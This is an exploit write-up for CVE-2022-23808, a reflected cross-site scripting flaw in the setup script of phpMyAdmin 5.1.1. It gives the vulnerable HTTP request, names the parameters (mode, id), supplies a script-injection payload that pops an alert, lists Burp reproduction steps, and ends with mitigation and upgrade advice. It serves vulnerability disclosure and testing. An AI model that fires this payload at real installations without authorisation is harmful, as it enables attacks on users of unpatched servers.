# phpMyAdmin Exploit

**Exploit Title :** phpMyAdmin 5.1.1 - XSS (Cross-site Scripting)                                                          
**Exploit Author :** [Dipak Panchal](https://twitter.com/DipakPanchal05) **([@th3.d1p4k](https://instagram.com/th3.d1p4k))**                 
**Vendor Homepage :** https://www.phpmyadmin.net                      
**Software Link :** https://www.phpmyadmin.net/files/5.1.1/                 
**Affected Versions :** phpMyAdmin versions of the 5.1 branch prior to 5.1.2 are affected.                
**Tested on :** Windows 10 and Linux    
**CVE :** [CVE-2022-23808](https://nvd.nist.gov/vuln/detail/CVE-2022-23808)       
**Reference :** https://www.phpmyadmin.net/security/PMASA-2022-2/         

### **Description:**
A series of weaknesses has been discovered that could allow an attacker to inject malicious code in to aspects of the setup script, which can allow XSS or HTML injection.

### **Request:**

```
GET /phpmyadmin/setup/index.php?page=servers&mode=test&id=test  HTTP/1.1      
Host: 127.0.0.1:1234       
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0      
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8      
Accept-Language: en-US,en;q=0.5     
Connection: close   
Cookie: pma_lang=en; phpMyAdmin=fs55xxxxxxx; pma_lang=en; pmaUser-1=xxxxxxxxxxxxxxxxxxxxxxxxxxx; phpMyAdmin=xxxxxxxxxxxxxxx; pmaAuth-1=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx           
Upgrade-Insecure-Requests: 1          
Cache-Control: max-age=0          
```

### **Vulnerable Parameter(s) :** 
* mode
* id

### **Payload :**
```
">'><script>alert(document.domain)</script>
```

### **Steps to reproduce :**

1. Capture above reuqest in burp.
2. Replace/Change XSS payload with vulnerable parameters.
3. Click on send and show response in browser.
4. You'll get popup!

## **Proof of Concept :**
![2022-01-26_21h45_23](https://user-images.githubusercontent.com/31427462/152356009-88cb5947-6abf-481f-9cc1-58c8cf4a6a12.png)


### **Mitigation :**
A phpMyAdmin installation with a configuration file config.inc.php will not allow access to the setup script, which in turn mitigates this attack.


### **Fix :**
Upgrade to phpMyAdmin 5.1.2 or newer or apply patch listed below.
